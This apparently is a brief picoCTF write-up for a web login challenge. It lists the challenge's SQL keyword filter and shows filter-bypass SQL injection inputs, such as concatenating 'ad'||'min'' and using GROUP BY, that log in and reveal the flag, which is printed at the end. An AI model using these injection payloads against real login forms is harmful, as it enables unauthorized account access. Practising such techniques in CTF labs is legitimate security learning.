# I get link for two sites, one which shows the filter of the signs i cannot use as sql injections to login
      
      Filters: or and true false union like = > < ; -- /* */ admin

# In next link i try to login using
   username : admin'
   password : admin
# It responses as " Filtered! " and does not give us any flag 

# In the hint it says "spaces are not filtered " 
# So now i try :
   username : ad'||'min'
   password : a' IS NOT 'b 
# It responses as " not admin "

# Since it is still not recognizing " admin " i try to change the password to " ' " 
   username : ad'||'min' GROUP BY 
   password : '
# It responses as " Congrats! You won! Check out filter.php "
   
on checking the link we get the flag " picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd} "
